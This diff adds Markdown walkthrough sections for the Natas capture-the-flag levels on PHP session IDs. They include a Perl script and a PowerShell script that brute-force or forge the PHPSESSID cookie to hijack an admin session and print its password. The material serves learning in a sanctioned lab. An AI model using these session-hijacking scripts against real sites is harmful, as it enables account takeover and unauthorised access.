@@ -1475,3 +1475,234 @@ while (length $natas18_pass < 32) {
 The sleep time of 5 seconds is enough to tell the difference.
 
 ## Level 17 ➡ Level 18
+
+The website contains a form with username and password fields. When logging in, sets up a cookie, locking the user to that account, hiding the login form.
+
+- Test the form.
+- Play with the cookie.
+- Inspect resources.
+- Find the vulnerability and understand how to abuse it.
+- Get the password.
+
+### Test form 17
+
+Basic tests:
+
+- Not providing any value and submitting logs in the user regardless.
+- There seems to be only two valid user groups: regular and admin.
+- Trying to reload the page after logging in forces the login details to be sent again.
+
+### Inspection 17
+
+#### HTML inspection 17
+
+Nothing interesting.
+
+#### HTTP inspection 17
+
+The first GET request doesn't seem to contain any relevant information. The POST request has the following body:
+
+```http
+username=example&password=example
+```
+
+The cookie that the login sets up:
+
+|  Cookie   | Value |
+| :-------: | :---: |
+| PHPSESSID |  22   |
+
+The value depends on the login information. On the PHP inspection shows that the max value is 640.
+
+#### PHP inspection 17
+
+Too much code. The tldr:
+
+- Defines `$maxid = 640` and uses it to generate a random id up to that limit.
+- The first thing it does regarding the session is verify the existence of cookie `PHPSESSID`. If it doesn't exist, PHP creates it.
+- It checks for the user that is currently in the session, if it's the admin, prints the password.
+
+### Resolution 17
+
+It is posible to send the cookie and its value in the headers. My first strategy is to bruteforce it.
+
+#### Bruteforcing 17
+
+The request handler:
+
+```perl
+sub req {
+    my ($candidate) = @_;
+    my %headers = (
+        'Authorization' => 'Basic ' . encode_base64("$user:$pass", ''),
+        'Content-Type' => 'application/x-www-form-urlencoded',
+        'Cookie' => "PHPSESSID=$candidate",
+    );
+    
+    my $response = $http->post($url, {
+        headers => \%headers,
+        content => "username=test&password=test"
+    });
+
+    unless ($response->{success}) {
+        die "Failed: $response->{status} $response->{content}\n";
+    } 
+
+    return $response->{content};
+}
+```
+
+- It sets up the cookie in the headers hash. The values of the body are irrelevant.
+
+The bruteforce logis is fairly simple:
+
+```perl
+for my $n (1..640) {
+    print "Testing cookie: $n\n";
+    my $res = req $n;
+
+    if ($res =~ 'You are an admin') {
+        print "Found it: $n\n";
+        my ($pass) = (req $n) =~ /Password:\s*(\S{32})/;
+        print $pass;
+        last;
+    }
+}
+```
+
+TLDR:
+
+1. Define the total possible values (1 to 640).
+2. Make the request with the current value in iteration as the cookie.
+3. If the html response contains the phrase *"You are an admin"*, the cookie was correct.
+4. When the correct cookie is found, prints the password.
+5. (OPTIONAL) to display only the password and not the whole html, parse it with a regex. Focus on the print format defined in the PHP file and the fact that all passwords are length 32.
+
+## Level 18 ➡ Level 19
+
+Same page as the previous level, this time it has additional information:
+
+> This page uses mostly the same code as the previous level, but session IDs are no longer sequential.
+
+The general plan to follow:
+
+- Test the form.
+- Inspect the resources, focusing on the cookies.
+- Understand the vulnerability and how to exploit it.
+- Get the password.
+
+### Testing form 18
+
+It works the same as the one from the previous level.
+
+### Inspection 18
+
+The focus of the inspection should be on the cookie set up by PHP.
+
+#### Cookie inspection 18
+
+Giving the form the following data:
+
+```text
+Username: natas20
+Password:
+```
+
+Produces the following cookie:
+
+```http
+PHPSESSID=3133362d6e617461733230
+```
+
+Some extra tests:
+
+| Username | Password |       PHPSESSID        |
+| :------: | :------: | :--------------------: |
+|          |          |        3535372d        |
+|  admin   |          |   3436332d61646d696e   |
+|          |  admin   |        3234372d        |
+|          | natas20  |        3437332d        |
+| natas20  | natas20  | 3539322d6e617461733230 |
+|  natas   |  natas   |    31362d6e61746173    |
+| natas20  |          | 3137312d6e617461733230 |
+
+By studying the results, I found that the username defines the part after the character `d`, and that stays constant. Running the form three times with username natas20:
+
+| Username | Password |       PHPSESSID        |
+| :------: | :------: | :--------------------: |
+| natas20  |          |  34322d6e617461733230  |
+| natas20  |          | 3232342d6e617461733230 |
+| natas20  |          | 3236322d6e617461733230 |
+
+So it seems that `6e617461733230` corresponds to `natas20`. It is also important to understand the meaning of the character `d`, as it appears in all results. In **hexadecimal** the letter 'd' corresponds to `-`. Giving all session ids the following format:
+
+```txt
+MAYBE_RANDOM_TEXT-natas20
+```
+
+With the new knowledge of the encoding method, let's run some extra tests:
+
+| Username | Password | HEX Decoded Cookie |
+| :------: | :------: | :----------------: |
+| natas20  | natas20  |    465-natas20     |
+| natas20  |          |    555-natas20     |
+| natas20  | natas20  |    278-natas20     |
+
+It looks like the id used for the bruteforce operation in the previous level it still there, but this time encoded with the username.
+
+### Resolution 18
+
+With the information collected in the cookie inspection process, the strategy becomes really clear:
+
+- Hex encode something that follows this format: `number-admin`. Because the admin's name is `admin`, not `natas20`.
+- Bruteforce the `number` part, maybe considering the max limit of 640 set on previous level.
+- Parse the html response to confirm the result.
+
+#### Bruteforcing 18
+
+The web request will be defined like this (using PowerShell this time):
+
+```ps1
+$Username = 'natas19'
+$Password = Get-Content -Path ../Pwds.txt | Select-Object -Skip 18 | Select-Object -First 1
+$Creds = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("$($Username):$($Password)"))
+
+function Invoke-PostRequest([string]$SessionId) {
+    $Request = @{
+        Uri = 'http://natas19.natas.labs.overthewire.org/'
+        Method = 'POST'
+        Headers = @{ 
+            Authorization = "Basic $Creds"
+            'Content-Type' = 'application/x-www-form-urlencoded'
+            Cookie = "PHPSESSID=$SessionId"
+        }
+        Body = @{
+            username = 'admin'
+            password = ""
+        }
+    }
+
+    return Invoke-WebRequest @Request
+}
+```
+
+While the bruteforce operation will be handled here:
+
+```ps1
+foreach ($n in 1..640) {
+    Write-Host "Testing cookie $n-admin"
+    $EncodedCandidate = ("$n-admin" | Format-Hex).HexBytes.ToLower() -replace ' ', ''
+    $Response = Invoke-PostRequest -SessionId $EncodedCandidate
+    if ($Response.Content -like "*You are an admin*") {
+        $Natas20 = ($Response.Content | Select-String -Pattern "Password:\s*([^<]+)" | Select-Object -First 1).Matches.Groups[1]
+        Write-Host -ForegroundColor Green "Password: $Natas20"
+        exit
+    }
+}
+```
+
+TLDR:
+
+1. Hex encodes the string `ITER_NUMBER-admin`.
+2. Makes the request.
+3. If the response contains the string *You are an admin*. Uses a regex to extract the password and stops execution.
